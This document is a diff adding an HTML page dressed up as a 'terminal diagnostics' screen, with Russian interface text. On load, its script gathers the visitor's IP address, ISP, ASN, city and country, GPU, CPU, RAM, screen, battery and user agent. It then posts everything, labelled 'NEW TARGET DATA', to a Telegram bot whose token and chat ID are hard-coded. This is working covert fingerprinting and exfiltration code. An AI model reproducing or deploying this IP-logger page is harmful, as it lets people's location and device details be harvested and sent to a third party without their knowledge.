@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TERMINAL_DIAGNOSTICS_V4</title>
+    <style>
+        :root {
+            --bg: #0a0a0c;
+            --text: #a0a0a5;
+            --accent: #ffffff;
+            --border: #1a1a1f;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: "SF Mono", "Fira Code", monospace;
+            font-size: 11px;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 700px;
+        }
+
+        .header {
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            color: var(--accent);
+        }
+
+        .section {
+            margin-bottom: 25px;
+        }
+
+        .section-title {
+            color: var(--accent);
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-decoration: underline;
+        }
+
+        .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            border-bottom: 1px solid #111;
+        }
+
+        .label { color: #555; }
+        .value { color: var(--text); text-align: right; word-break: break-all; max-width: 60%; }
+
+        #status-box {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 10px;
+            border: 1px solid var(--border);
+            background: #000;
+        }
+
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <span>SESSION_ID: <span id="sid"></span></span>
+        <span class="blink">● ANALYZING</span>
+    </div>
+
+    <div class="section">
+        <div class="section-title">NETWORK_ANALYSIS</div>
+        <div id="net-data">Загрузка сетевых узлов...</div>
+    </div>
+
+    <div class="section">
+        <div class="section-title">HARDWARE_SIGNATURE</div>
+        <div id="hw-data">
+            <div class="row"><span class="label">PLATFORM</span><span class="value" id="platform">...</span></div>
+            <div class="row"><span class="label">CPU_THREADS</span><span class="value" id="cores">...</span></div>
+            <div class="row"><span class="label">RAM_ESTIMATE</span><span class="value" id="ram">...</span></div>
+            <div class="row"><span class="label">GPU_RENDERER</span><span class="value" id="gpu">...</span></div>
+            <div class="row"><span class="label">SCREEN_RES</span><span class="value" id="screen">...</span></div>
+            <div class="row"><span class="label">BATTERY_LEVEL</span><span class="value" id="bat">...</span></div>
+        </div>
+    </div>
+
+    <div class="section">
+        <div class="section-title">ENVIRONMENT_LOGS</div>
+        <div id="logs" style="color: #444;">
+            [0.00] Инициализация системы...<br>
+            [0.15] Запрос разрешений API...<br>
+            [0.45] Сбор отпечатков браузера...<br>
+        </div>
+    </div>
+</div>
+
+<div id="status-box">LOGGING: <span style="color: #00ff00;">REMOTE_SYNC_ON</span></div>
+
+<script>
+    // --- НАСТРОЙКИ ---
+    const TG_TOKEN = '8666347015:AAH0tp9RaAEof4-WiWqdb1f_YncultKDdTQ';
+    const TG_CHAT_ID = '7386430834';
+    // -----------------
+
+    document.getElementById('sid').innerText = Math.random().toString(36).substring(2, 10).toUpperCase();
+
+    async function init() {
+        // 1. Сбор сетевых данных (IP, Провайдер, ASN)
+        let netInfo = {};
+        try {
+            const res = await fetch('https://ipwho.is/');
+            netInfo = await res.json();
+        } catch(e) {
+            netInfo = { ip: 'ERROR', connection: { isp: 'UNKNOWN' } };
+        }
+
+        // 2. Сбор Hardware данных
+        const gpuInfo = getGPU();
+        const battery = await getBattery();
+        
+        const fullData = {
+            ip: netInfo.ip,
+            isp: netInfo.connection?.isp || 'N/A',
+            org: netInfo.connection?.org || 'N/A',
+            asn: netInfo.connection?.asn || 'N/A',
+            type: netInfo.type || 'N/A',
+            geo: `${netInfo.city}, ${netInfo.country}`,
+            platform: navigator.platform,
+            cores: navigator.hardwareConcurrency || 'N/A',
+            ram: (navigator.deviceMemory || 'N/A') + ' GB',
+            gpu: gpuInfo,
+            screen: `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio}x)`,
+            ua: navigator.userAgent,
+            battery: battery
+        };
+
+        render(fullData);
+        sendToTG(fullData);
+    }
+
+    function getGPU() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const ext = gl.getExtension('WEBGL_debug_renderer_info');
+            return ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : "Generic Hardware";
+        } catch(e) { return "Disabled/Mobile Protection"; }
+    }
+
+    async function getBattery() {
+        try {
+            const b = await navigator.getBattery();
+            return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+        } catch(e) { return "N/A (iOS/Desktop)"; }
+    }
+
+    function render(d) {
+        document.getElementById('net-data').innerHTML = `
+            <div class="row"><span class="label">IPV4_ADDRESS</span><span class="value" style="color:white">${d.ip}</span></div>
+            <div class="row"><span class="label">NETWORK_ISP</span><span class="value">${d.isp}</span></div>
+            <div class="row"><span class="label">ORGANIZATION</span><span class="value">${d.org}</span></div>
+            <div class="row"><span class="label">ASN_CODE</span><span class="value">${d.asn}</span></div>
+            <div class="row"><span class="label">LOCATION</span><span class="value">${d.geo}</span></div>
+        `;
+        document.getElementById('platform').innerText = d.platform;
+        document.getElementById('cores').innerText = d.cores;
+        document.getElementById('ram').innerText = d.ram;
+        document.getElementById('gpu').innerText = d.gpu;
+        document.getElementById('screen').innerText = d.screen;
+        document.getElementById('bat').innerText = d.battery;
+        
+        document.getElementById('logs').innerHTML += `[1.20] Пакеты сформированы.<br>[1.50] Отчет отправлен на удаленный узел.`;
+    }
+
+    function sendToTG(d) {
+        const text = `
+📦 **NEW TARGET DATA**
+──────────────────
+🌐 **NETWORK**
+IP: \`${d.ip}\`
+ISP: ${d.isp}
+ASN: ${d.asn}
+Geo: ${d.geo}
+
+💻 **HARDWARE**
+OS: ${d.platform}
+GPU: ${d.gpu}
+Cores: ${d.cores} | RAM: ${d.ram}
+Screen: ${d.screen}
+Battery: ${d.battery}
+
+📱 **USER AGENT**
+\`${d.ua}\`
+        `;
+
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'Markdown' })
+        });
+    }
+
+    init();
+</script>
+</body>
+</html>
